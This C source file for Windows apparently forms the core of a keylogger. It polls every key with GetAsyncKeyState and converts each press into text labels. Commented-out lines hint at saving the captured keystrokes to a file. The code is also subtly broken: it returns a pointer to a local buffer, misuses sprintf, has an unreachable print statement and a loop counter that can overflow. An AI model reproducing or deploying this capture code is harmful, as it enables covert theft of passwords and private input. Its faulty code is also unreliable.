#include<stdio.h>
#include<windows.h>
#include<Winuser.h>
#include<stdlib.h>

char * getClick();
char * convertToString(int key);


char * getClick()
{
    char i;
		
	for(i=8;i<=190;i++)
	{
		if(GetAsyncKeyState(i)==-32767)
		{
			return convertToString(i);
			printf("Saved...");
		}
	}
	return "[unknown key]";
}


char * convertToString(int key)
{

	if((key==1)||(key==2))
		return "[MB]";

  //cout<<key_stroke<<endl;  // just in case //if you require to show key-strokes.
// You need to care about special characters. //Code below that will do it. :)
   if(key==8)
       return "[BackSpace]";

	else if(key==13)
		return "\n";
	
	else if(key==32)
		return " ";
	
	else if(key==VK_TAB)
		return "[TAB]";
	
	else if(key==VK_SHIFT)
	    return "[SHIFT]";
	
	else if(key==VK_CONTROL)
	    return "[CONTROL]";
	
	else if(key==VK_ESCAPE)
	    return "[ESCAPE]";
	
	else if(key==VK_END)
	    return "[END]";
	
	else if(key==VK_HOME)
	    return "[HOME]";
	
	else if(key==VK_LEFT)
	    return "[LEFT]";
	
	else if(key==VK_UP)
	    return "[UP]";
	
	else if(key==VK_RIGHT)
	    return "[RIGHT]";
	
	else if(key==VK_DOWN)
	    return "[DOWN]";
	
	else if(key==190 || key==110)
       return ".";

    else 
	{
		char buffer[10];
		sprintf(buffer, "%s", &key);
		return buffer;
	}
       //fprintf(ptr,"%s",&key);
	   //return "someKey";

}
